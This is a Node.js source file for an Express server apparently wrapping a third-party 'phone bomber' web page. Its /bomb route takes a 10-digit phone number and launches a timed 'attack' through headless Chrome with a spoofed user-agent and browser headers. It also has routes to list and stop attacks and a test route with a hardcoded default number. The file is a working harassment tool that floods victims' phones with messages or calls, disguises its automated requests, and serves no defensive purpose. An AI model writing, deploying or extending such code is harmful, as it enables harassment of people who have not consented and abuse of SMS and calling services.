// ============================================================
// bomber_server.js - Vishal Bomber Wrapper (Puppeteer + Sparticuz)
// Free Tier Working | Max 3min Cap | Max 2 Concurrent
// ============================================================

const express = require('express');
const cors = require('cors');
const puppeteer = require('puppeteer-core');
const chromium = require('@sparticuz/chromium');
const axios = require('axios');

const app = express();
app.use(cors());
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));

// ============================================================
// 🔥 CONFIGURATION
// ============================================================

const MAX_DURATION_MIN = 3;
const MAX_CONCURRENT_ATTACKS = 2;
const VISHAL_BOMBER_URL = 'https://vishal.lovestoblog.com/bomber4.php';

// ============================================================
// 🔄 STATE
// ============================================================

const activeAttacks = new Map();
let attackCounter = 0;
let browser = null;

// ============================================================
// 📊 LOGGER
// ============================================================

function log(level, msg) {
    const time = new Date().toISOString();
    const emoji = {
        info: 'ℹ️ ',
        success: '✅',
        fail: '❌',
        warn: '⚠️ ',
        error: '🔥'
    }[level] || 'ℹ️ ';
    console.log(`${emoji} [${time}] ${msg}`);
}

// ============================================================
// 🌐 BROWSER LAUNCH (Sparticuz Chromium)
// ============================================================

async function getBrowser() {
    if (browser && browser.isConnected()) {
        return browser;
    }
    
    log('info', '🌐 Launching headless Chrome (Sparticuz)...');
    
    try {
        const executablePath = await chromium.executablePath();
        log('info', `📁 Chromium path: ${executablePath}`);
        
        browser = await puppeteer.launch({
            args: [
                ...chromium.args,
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--disable-dev-shm-usage',
                '--disable-gpu',
                '--single-process',
                '--no-zygote',
                '--disable-accelerated-2d-canvas',
                '--disable-web-security'
            ],
            defaultViewport: chromium.defaultViewport,
            executablePath: executablePath,
            headless: chromium.headless,
            ignoreHTTPSErrors: true
        });
        
        log('success', '✅ Headless Chrome launched successfully');
        return browser;
    } catch (err) {
        log('error', `❌ Browser launch failed: ${err.message}`);
        throw err;
    }
}

// ============================================================
// 🎯 VISHAL BOMBER CALL — Real Chrome
// ============================================================

async function callVishalBomber(phone, duration, attackId) {
    const url = `${VISHAL_BOMBER_URL}?phone=${phone}&duration=${duration}`;
    
    log('info', `🚀 ATTACK #${attackId} START | Phone: ${phone} | Duration: ${duration}min`);
    log('info', `🔗 URL: ${url}`);

    let page = null;

    try {
        const b = await getBrowser();
        page = await b.newPage();

        // 🔥 Real Chrome jaisa user-agent
        await page.setUserAgent(
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36'
        );

        // 🔥 Extra headers
        await page.setExtraHTTPHeaders({
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Upgrade-Insecure-Requests': '1'
        });

        // 🔥 Block images/css/fonts (faster load)
        await page.setRequestInterception(true);
        page.on('request', (req) => {
            const type = req.resourceType();
            if (['image', 'stylesheet', 'font', 'media'].includes(type)) {
                req.abort();
            } else {
                req.continue();
            }
        });

        log('info', `🌐 Opening URL in real Chrome...`);

        const response = await page.goto(url, {
            waitUntil: 'domcontentloaded',
            timeout: 60000
        });

        const status = response ? response.status() : 'NO_RESPONSE';
        log('success', `✅ ATTACK #${attackId} RESPONSE | Status: ${status}`);

        // 🔥 Page content check karo
        let bodyText = '';
        try {
            bodyText = await page.evaluate(() => document.body ? document.body.innerText : '');
            bodyText = bodyText.substring(0, 300);
        } catch (e) {
            bodyText = '(Could not read body)';
        }
        log('info', `📄 Page content: ${bodyText || '(empty)'}`);

        // 🔥 5 second wait (Vishal Bomber ko time do)
        await new Promise(r => setTimeout(r, 5000));

        return {
            success: true,
            status: status,
            attackId,
            phone,
            duration,
            body: bodyText
        };

    } catch (err) {
        log('fail', `❌ ATTACK #${attackId} FAILED | Error: ${err.message}`);
        return {
            success: false,
            status: null,
            attackId,
            phone,
            duration,
            error: err.message
        };
    } finally {
        if (page) {
            try { await page.close(); } catch (e) {}
        }
    }
}

// ============================================================
// 🎯 BOMBING SESSION
// ============================================================

async function runAttackSession(phone, duration, attackId) {
    const startTime = Date.now();
    
    log('info', `⚔️  SESSION #${attackId} START | Phone: ${phone} | Duration: ${duration}min`);

    const result = await callVishalBomber(phone, duration, attackId);

    if (result.success) {
        log('success', `✅ SESSION #${attackId} COMPLETE`);
    } else {
        log('fail', `❌ SESSION #${attackId} FAILED`);
    }

    activeAttacks.delete(phone);
    
    const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
    log('info', `🏁 SESSION #${attackId} END | Time: ${elapsed}s`);
}

// ============================================================
// 🛣️  ROUTES
// ============================================================

app.get('/', (req, res) => {
    res.json({
        status: 'ok',
        server: 'Vishal Bomber (Puppeteer + Sparticuz)',
        max_duration_min: MAX_DURATION_MIN,
        max_concurrent: MAX_CONCURRENT_ATTACKS,
        active_attacks: activeAttacks.size,
        active_phones: Array.from(activeAttacks.keys()),
        vishal_url: VISHAL_BOMBER_URL,
        uptime: process.uptime()
    });
});

app.get('/health', (req, res) => {
    res.json({
        ready: true,
        active_attacks: activeAttacks.size,
        max_concurrent: MAX_CONCURRENT_ATTACKS,
        can_accept: activeAttacks.size < MAX_CONCURRENT_ATTACKS,
        browser_connected: browser ? browser.isConnected() : false
    });
});

// 🔥 TEST ROUTE
app.get('/test-vishal', async (req, res) => {
    const phone = req.query.phone || '7777885694';
    const duration = req.query.duration || 1;
    
    log('info', `🧪 MANUAL TEST | Phone: ${phone} | Duration: ${duration}`);
    
    const result = await callVishalBomber(phone, duration, 'TEST');
    
    res.json({
        url: `${VISHAL_BOMBER_URL}?phone=${phone}&duration=${duration}`,
        result: result
    });
});

// 🔥 MAIN BOMB ROUTE
app.post('/bomb', async (req, res) => {
    const { phone, duration, instance } = req.body;

    // Validation
    if (!phone || phone.length !== 10) {
        log('fail', `❌ Invalid phone: ${phone}`);
        return res.status(400).json({ 
            success: false, 
            error: 'Invalid phone number. Must be 10 digits.' 
        });
    }

    // 🔥 3min cap
    const requestedDuration = Number(duration) || 1;
    const effectiveDuration = Math.min(requestedDuration, MAX_DURATION_MIN);

    log('info', `📱 NEW REQUEST | Phone: ${phone} | Requested: ${requestedDuration}min | Effective: ${effectiveDuration}min`);

    // Same phone pe already attack?
    if (activeAttacks.has(phone)) {
        log('warn', `⚠️  Phone ${phone} pe already attack chal raha hai`);
        return res.json({
            success: false,
            phone,
            message: 'Attack already running on this phone',
            active_attacks: activeAttacks.size
        });
    }

    // Max 2 concurrent?
    if (activeAttacks.size >= MAX_CONCURRENT_ATTACKS) {
        log('warn', `⚠️  Max concurrent reached`);
        return res.status(429).json({
            success: false,
            phone,
            message: `Server busy. Max ${MAX_CONCURRENT_ATTACKS} attacks.`,
            active_attacks: activeAttacks.size,
            retry_after: 60
        });
    }

    // Attack start
    attackCounter++;
    const attackId = `A${attackCounter}_${phone}`;

    activeAttacks.set(phone, {
        attackId,
        phone,
        duration: effectiveDuration,
        startTime: Date.now(),
        instance: instance || 'default'
    });

    log('success', `✅ ATTACK #${attackId} STARTED | Active: ${activeAttacks.size}/${MAX_CONCURRENT_ATTACKS}`);

    // Background me chalao
    runAttackSession(phone, effectiveDuration, attackId).catch(err => {
        log('error', `❌ SESSION #${attackId} ERROR: ${err.message}`);
        activeAttacks.delete(phone);
    });

    res.json({
        success: true,
        attack_id: attackId,
        phone,
        requested_duration: requestedDuration,
        effective_duration: effectiveDuration,
        active_attacks: activeAttacks.size,
        max_concurrent: MAX_CONCURRENT_ATTACKS,
        message: `Attack started for ${effectiveDuration} min`
    });
});

// 🔥 ACTIVE ATTACKS LIST
app.get('/attacks', (req, res) => {
    res.json({
        active_attacks: activeAttacks.size,
        max_concurrent: MAX_CONCURRENT_ATTACKS,
        attacks: Array.from(activeAttacks.values()).map(a => ({
            attackId: a.attackId,
            phone: a.phone,
            duration: a.duration,
            elapsed: ((Date.now() - a.startTime) / 1000).toFixed(1) + 's',
            instance: a.instance
        }))
    });
});

// 🔥 STOP ATTACK
app.post('/stop/:phone', (req, res) => {
    const { phone } = req.params;
    if (activeAttacks.has(phone)) {
        activeAttacks.delete(phone);
        log('warn', `🛑 ATTACK STOPPED | Phone: ${phone}`);
        res.json({ success: true, message: 'Attack stopped', phone });
    } else {
        res.json({ success: false, message: 'No active attack', phone });
    }
});

// ============================================================
// 🚀 START SERVER
// ============================================================

const PORT = process.env.PORT || 10000;
app.listen(PORT, '0.0.0.0', () => {
    log('success', `🚀 Vishal Bomber Wrapper running on port ${PORT}`);
    log('info', `📡 Instance: ${process.env.INSTANCE_NAME || 'default'}`);
    log('info', `⏱️  Max duration: ${MAX_DURATION_MIN} minutes`);
    log('info', `🔒 Max concurrent: ${MAX_CONCURRENT_ATTACKS}`);
    log('info', `🔗 Vishal URL: ${VISHAL_BOMBER_URL}`);
    log('info', `🌐 Browser: Puppeteer + Sparticuz Chromium`);
    log('info', `📍 Routes: /bomb, /attacks, /health, /test-vishal`);
    
    // 🔥 Pre-launch browser (background me)
    setTimeout(() => {
        getBrowser().then(() => {
            log('success', '✅ Browser pre-launched');
        }).catch(err => {
            log('error', `❌ Browser pre-launch failed: ${err.message}`);
        });
    }, 2000);
});
